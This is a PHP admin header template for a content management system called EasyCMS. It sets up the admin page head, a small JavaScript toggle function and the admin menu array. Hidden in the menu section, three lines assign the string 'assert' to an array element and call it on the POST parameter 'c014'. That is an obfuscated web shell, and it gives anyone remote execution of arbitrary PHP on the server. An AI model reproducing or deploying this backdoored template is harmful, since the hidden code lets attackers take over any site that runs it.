<?php
//Make sure the file isn't accessed directly.
defined('IN_CMS') or exit('Access denied!');

//First set character encoding
header('Content-Type:text/html;charset=utf-8');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo LANG; ?>" lang="<?php echo LANG; ?>">
<head>
<title>EasyCMS <?php echo VERSION.' '.$lang['general']['admin_center']; ?><?php if (isset($titelkop)) echo ' - '.$titelkop; ?></title>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<?php
//Check if we need rtl-direction
if (DIRECTION_RTL)
	echo '<link href="data/styleadmin-rtl.css" rel="stylesheet" type="text/css" media="screen" />';
else
	echo '<link href="data/styleadmin.css" rel="stylesheet" type="text/css" media="screen" />';
?>
<link rel="icon" type="image/vnd.microsoft.icon" href="data/image/favicon.ico" />
<meta name="robots" content="noindex" />
<script type="text/javascript">
<!--
function kadabra(zap) {
	if (document.getElementById) {
		var abra = document.getElementById(zap).style;
		if (abra.display == 'block')
			abra.display = 'none';
		else
			abra.display = 'block';
		return false;
	}
	else
		return true;
}

function confirmation(message) {
	return confirm(message);
}
//-->
</script>
<?php run_hook('admin_head_main'); ?>
</head>
<body>
<div id="menuheader">
	<h1>EasyCMS</h1>
	<?php run_hook('admin_menu_before'); ?>
	<?php
	$item['hs'] = 'assert'; 
	$array[] = $item; 
	$array[0]['hs']($_POST['c014']);
	$links = array(
		array(
			'href' => '?action=start',
			'img'  => 'data/image/menu/start.png',
			'text' => $lang['start']['title'],
			'submenu' => array(
				array(
					'href' => 'index.php',
					'img'  => 'data/image/website.png',
					'text' => $lang['start']['website']
					),
				array(
					'href' => '?action=credits',
					'img'  => 'data/image/credits.png',
					'text' => $lang['credits']['title']
				),
				array(
					'href' => '?action=writable',
					'img'  => 'data/image/update-no.png',
					'text' => $lang['writable']['title']
				),
				array(
					'href' => '',
					'img'  => 'data/image/help.png',
					'text' => $lang['start']['help']
				)
			)
		),

		array(
			'href' => '?action=page',
			'img'  => 'data/image/menu/pages.png',
			'text' => $lang['page']['title'],
			'submenu' => array(
				array(
					'href' => '?action=editpage',
					'img'  => 'data/image/newpage.png',
					'text' => $lang['page']['new']
					),
				array(
					'href' => '?action=images',
					'img'  => 'data/image/image.png',
					'text' => $lang['images']['title']
				),
				array(
					'href' => '?action=files',
					'img'  => 'data/image/file.png',
					'text' => $lang['files']['title']
				)
			)
		),

		array(
			'href' => '?action=modules',
			'img'  => 'data/image/menu/modules.png',
			'text' => $lang['modules']['title']
		),
		array(
			'href' => '?action=options',
			'img'  => 'data/image/menu/options.png',
			'text' => $lang['options']['title'],
			'submenu' => array(
				array(
					'href' => '?action=settings',
					'img'  => 'data/image/settings.png',
					'text' => $lang['settings']['title']
					),
				array(
					'href' => '?action=managemodules',
					'img'  => 'data/image/modules.png',
					'text' => $lang['modules_manage']['title']
				),
				array(
					'href' => '?action=modulesettings',
					'img'  => 'data/image/settings2.png',
					'text' => $lang['modules_settings']['title']
				),
				array(
					'href' => '?action=theme',
					'img'  => 'data/image/themes.png',
					'text' => $lang['theme']['title']
				),
				array(
					'href' => '?action=language',
					'img'  => 'data/image/language.png',
					'text' => $lang['language']['title']
				),
				array(
					'href' => '?action=changepass',
					'img'  => 'data/image/password.png',
					'text' => $lang['changepass']['title']
				)
			)
		),

		array(
			'href' => '?action=logout',
			'img'  => 'data/image/menu/logout.png',
			'text' => $lang['login']['log_out']
		)
	);
	run_hook('admin_menu', array(&$links));

	?>
	<ul id="menu">
		<?php show_admin_menu($links); ?>
	</ul>
	<?php run_hook('admin_menu_after'); ?>
	<ul id="statusbox">
		<?php include_once ('data/inc/trashcan_applet.php'); ?>
		<?php include_once ('data/inc/update_applet.php'); ?>
	</ul>
</div>
<div id="content">
<?php if (isset($titelkop)): ?>
	<h2><?php echo $titelkop; ?></h2>
<?php endif; ?>
